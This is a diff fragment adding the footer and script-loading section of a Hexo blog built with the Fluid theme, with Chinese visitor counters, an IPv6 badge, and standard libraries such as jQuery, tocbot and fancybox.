+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br> <a href="https://ipw.cn/ipv6webcheck/?site=hackerterry.netlify.app" title="本站支持IPv6访问" target="_blank"><img style="display:inline-block;vertical-align:middle" alt="本站支持IPv6访问" src="https://static.ipw.cn/icon/ipv6-s5.svg" srcset="/img/loading.gif" lazyload></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
